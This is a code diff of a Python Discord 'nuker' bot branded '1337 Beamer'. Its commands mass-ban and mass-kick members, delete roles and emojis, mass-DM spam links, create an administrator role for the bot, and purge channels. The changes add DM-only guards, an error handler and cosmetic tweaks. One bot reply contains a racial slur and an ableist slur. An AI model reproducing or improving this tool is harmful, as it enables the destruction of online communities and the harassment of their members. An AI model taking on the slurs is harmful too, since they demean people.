@@ -2,7 +2,7 @@
 
 dm_msg = "**1337 Beamed You** https://youtu.be/gGzOhy9vNkg\nhttps://discord.gg/pE2f8KaK3R"
 spam_messages = ["@everyone **1337 wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by 1337 | **https://discord.gg/pE2f8KaK3R"]
-webhook_usernames = ["1337 Wizzed U", "1337", "1337 BEAMER", "🤫"]
+webhook_usernames = ["1337 Wizzed U", "1337", "1337 BEAMER", "🤫", "1337 NUUUKED"]
 
 import discord, random, aiohttp, asyncio, json, os, threading
 from discord import Webhook, AsyncWebhookAdapter
@@ -10,6 +10,8 @@ from discord.ext import commands
 from colorama import Fore as C
 from time import sleep
 from discord_webhook import DiscordWebhook, DiscordEmbed
+
+os.system("cls")
 
 with open('config.json') as f:
     conf = json.load(f)
@@ -21,7 +23,6 @@ with open('config.json') as f:
 
 bot = commands.Bot(command_prefix = BOT_PREFIX, case_insensitive=True, intents=discord.Intents.all())
 bot.remove_command("help")
-
 
 async def status_task():
     while True:
@@ -64,9 +65,9 @@ async def on_ready():
   print(f"{C.BLUE}Starting Status..{C.RESET}\n")
   loop = asyncio.get_event_loop()
   loop.create_task(status_task())
-  await asyncio.sleep(1)
+  sleep(.7)
   print(f'''  ╔═════════════════════════════════════════════════╗
-  ║ Bot Name: {C.YELLOW}{bot.user.name} {C.WHITE}({C.YELLOW}{bot.user.id}{C.WHITE}){C.RESET}    ║
+  ║ Bot Name: {C.YELLOW}{bot.user.name} {C.WHITE}({C.YELLOW}{bot.user.id}{C.WHITE}){C.RESET}      ║
   ║ Prefix: {C.YELLOW}{BOT_PREFIX}{C.RESET}                                       ║
   ║ Version: {C.YELLOW}1.0{C.RESET}                                    ║
   ║ {C.MAGENTA}DM Features Coming Soon..{C.RESET}                       ║
@@ -77,22 +78,28 @@ async def on_ready():
 @bot.command()
 @commands.cooldown(1, 10, commands.BucketType.user)
 async def help(ctx):
- author = ctx.author
- await ctx.message.delete()
- embed = discord.Embed(color=0x363636, timestamp=ctx.message.created_at)
- embed.set_author(name="1337 Beamer | In the shadows", icon_url=ctx.author.avatar_url)
- embed.add_field(name=f"{BOT_PREFIX}help", value="Shows this message.", inline=False)
- embed.add_field(name=f"{BOT_PREFIX}wizz", value="Nukes The Server.", inline=False)
- embed.add_field(name=f"{BOT_PREFIX}massban", value="Bans All Members.", inline=False)
- embed.add_field(name=f"{BOT_PREFIX}masskick", value="Kicks All Members.", inline=False)
- embed.add_field(name=f"{BOT_PREFIX}ms", value="Tells You The Bots Latency.", inline=False)
- embed.add_field(name=f"{BOT_PREFIX}mention", value="Spams All Messages.", inline=False)
- embed.add_field(name=f"{BOT_PREFIX}droles", value="Deletes All The Roles.", inline=False)
- embed.add_field(name=f"{BOT_PREFIX}roles", value="Creates All The Roles", inline=False)
- await author.send(embed=embed)
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
+  author = ctx.author
+  await ctx.message.delete()
+  embed = discord.Embed(color=0x363636, timestamp=ctx.message.created_at)
+  embed.set_author(name="1337 Beamer | In the shadows", icon_url=ctx.author.avatar_url)
+  embed.add_field(name=f"{BOT_PREFIX}help", value="Shows this message.", inline=False)
+  embed.add_field(name=f"{BOT_PREFIX}wizz", value="Nukes The Server.", inline=False)
+  embed.add_field(name=f"{BOT_PREFIX}massban", value="Bans All Members.", inline=False)
+  embed.add_field(name=f"{BOT_PREFIX}masskick", value="Kicks All Members.", inline=False)
+  embed.add_field(name=f"{BOT_PREFIX}ms", value="Tells You The Bots Latency.", inline=False)
+  embed.add_field(name=f"{BOT_PREFIX}mention", value="Spams All Messages.", inline=False)
+  embed.add_field(name=f"{BOT_PREFIX}droles", value="Deletes All The Roles.", inline=False)
+  embed.add_field(name=f"{BOT_PREFIX}roles", value="Creates All The Roles", inline=False)
+  await author.send(embed=embed)
 
 @bot.command()
 async def wizz(ctx):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
   if ctx.guild.id == "784489385571647541":
     await ctx.send("Nuking")
     await ctx.send("sike nigga, you're retarded, I was programmed not to nuke this server")
@@ -102,6 +109,9 @@ async def wizz(ctx):
 
 @bot.command(pass_context=True)
 async def massnick(ctx, rename_to):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
   await ctx.message.delete()
   for user in list(ctx.guild.name):
     try:
@@ -113,6 +123,9 @@ async def massnick(ctx, rename_to):
 
 @bot.command(pass_context=True)
 async def adminrole(ctx):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
     guild = ctx.message.guild
     perms = discord.Permissions(8)
     await guild.create_role(name='1337', permissions=perms)
@@ -123,8 +136,11 @@ async def adminrole(ctx):
 
 @bot.command()
 async def delemojis(ctx):
- await ctx.message.delete()
- for emoji in list(ctx.guild.emojis):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
+  await ctx.message.delete()
+  for emoji in list(ctx.guild.emojis):
             try:
                 await emoji.delete()
                 print (f"{emoji.name} has been deleted in {ctx.guild.name}")
@@ -133,6 +149,9 @@ async def delemojis(ctx):
 
 @bot.command()
 async def dmall(ctx):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
         await ctx.message.delete()
         for user in ctx.guild.members:
             try:
@@ -144,6 +163,9 @@ async def dmall(ctx):
 
 @bot.command()
 async def massban(ctx):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
   await ctx.message.delete()
   for user in list(ctx.guild.members):
     try:
@@ -154,6 +176,9 @@ async def massban(ctx):
 
 @bot.command()
 async def masskick(ctx, guild):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
   guild = ctx.message.guild
   for user in list(ctx.guild.members):
     try:
@@ -173,6 +198,9 @@ async def delroles(ctx):
 
 @bot.command()
 async def clear(ctx, amount=5):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
   await ctx.message.delete()
   await ctx.channel.purge(limit=amount)
   
@@ -185,6 +213,9 @@ async def roles(ctx):
 
 @bot.command()
 async def force_restart(ctx):
+ if ctx.guild is None:
+  await ctx.send("Commands Not Supported In DM.")
+ else:
   if ctx.channel.id == ctx.author.dm_channel.id:
     await ctx.message.delete()
     await ctx.author.send("**Restarting...**")
@@ -217,22 +248,20 @@ async def on_member_join(member):
  if member.bot:
    await member.ban(reason="Not stealing 1337's wizz, clown")
  else:
-   await member.ban(reason="1337 wizzed this")
+   return
 
-#@bot.event
-#async def on_command_error(ctx, error):
-#  if isinstance(error, commands.CommandNotFound):
-#    await ctx.send(f"\n{C.RED}[-] [ERROR] ~ {error}{C.RESET}")
-#  else:
-#    await ctx.send(f"\n{C.RED}[-] [ERROR] ~ {error}{C.RESET}")
+@bot.event
+async def on_command_error(ctx, error):
+    print(f"{C.YELLOW}[!] {C.RED}[ERROR] ~ {error}{C.RESET}")
 
 def _input():
-        sleep(7)
+        sleep(6)
         while True:
             inp = input(f"{C.WHITE}[{C.RED}1337 Nuker{C.WHITE}] ")
             if inp == "help":
                 print(f'''
-                                          {C.CYAN}-- Basic Help --
+                                         {C.CYAN}-- Basic Help --
+                                         
         {C.GREEN}prefix  :: {C.RED}Shows the Bot prefix.                            :: {C.MAGENTA}{BOT_PREFIX}{C.RESET}
         {C.GREEN}ping    :: {C.RED}Shows the bots response time to Discord.         :: {C.MAGENTA}{round(bot.ws.latency * 1000)}{C.RESET}
         {C.GREEN}guilds  :: {C.RED}Shows the amount of guilds your bot's in.        :: {C.MAGENTA}{len(bot.guilds)}{C.RESET}
@@ -240,12 +269,13 @@ def _input():
 	{C.GREEN}restart :: {C.RED}Restarts the Bot. (only works in cmd prompt)     :: {C.MAGENTA}restart{C.RESET}
         {C.GREEN}close   :: {C.RED}Closes the bot & cmd window.                     :: {C.MAGENTA}close{C.RESET}
 
-                                        {C.CYAN}-- Fuck Some Shit --{C.GREEN}
-
-        nuke    :: {C.RED}Nukes a server the bot is in *COMING SOON*       :: {C.MAGENTA}*Coming Soon*{C.RESET}
+                                       {C.CYAN}-- Fuck Some Shit --{C.RESET}
+                                       
+        {C.GREEN}cmdwizz :: {C.RED}Nukes a server the bot is in *COMING SOON*       :: {C.MAGENTA}*Coming Soon*{C.RESET}
+        {C.GREEN}bothelp :: {C.RED}Shows all the bots commands *COMING SOON*        :: {C.MAGENTA}*Coming Soon*{C.RESET}
         ''')
             if inp == "close":
-                print("Closing...")
+                print(f"{C.YELLOW}[!] {C.RESET}Closing...")
                 sleep(0.5)
                 os._exit(0)
             if inp == "prefix":
